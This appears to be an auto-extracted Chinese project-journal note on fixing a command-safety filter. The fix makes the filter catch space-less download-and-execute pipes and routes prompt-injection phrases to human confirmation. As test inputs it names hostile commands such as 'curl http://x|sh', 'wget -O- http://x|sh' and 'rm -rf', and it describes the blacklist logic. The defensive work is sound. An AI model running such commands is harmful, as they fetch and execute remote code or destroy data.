---
title: "P1-1 管道下载执行补漏 + AC4 改 CONFIRM 对齐 spec — 主理人独立复验通过"
type: concept
project: "自动系统"
source: journal.md
tags: ["pytest", "安全", "测试", "规格", "黑名单"]
concept_id: journal-017
created: 2026-07-08
updated: 2026-07-08 11:29
---

# P1-1 管道下载执行补漏 + AC4 改 CONFIRM 对齐 spec — 主理人独立复验通过

> 来源: `journal.md` | 项目: [[../projects/自动系统]]

🔧 [鲁千机-fix-3] P1-1 管道下载执行补漏 + AC4 改 CONFIRM 对齐 spec — 主理人独立复验通过
- 补漏根因：_scan_destructive 的 pipe 检测 sink 用 token 全等且 `|` 未拆分 → 无空格管道(curl http://x|sh)漏判；改为下载源出现且文本含 `|` 或 shell 接收端子串即判破坏。
- AC4 对齐：check() 将注入检测移至黑名单之前 → 含诱导短语(即便夹带 rm -rf)返回 CONFIRM（标记不可信、交人工二次确认），与 _scan_injection 语义一致；纯破坏性命令(无诱导短语)仍硬 BLOCK，黑名单未被削弱。
- 主理人独立复验：verify_security_fixes.py 扩至 34 项硬断言全 PASS（含无空格管道 curl http://x|sh / wget -O- http://x|sh 命中、注入短语→CONFIRM、纯破坏命令→BLOCK）；pytest 经系统 Python39 复跑 139 passed / 0 failed（与 lu-qianji-fix-3 报告一致）。安全闭环确证非假绿。

---
*由 extract_concepts_from_journal.py 自动提炼*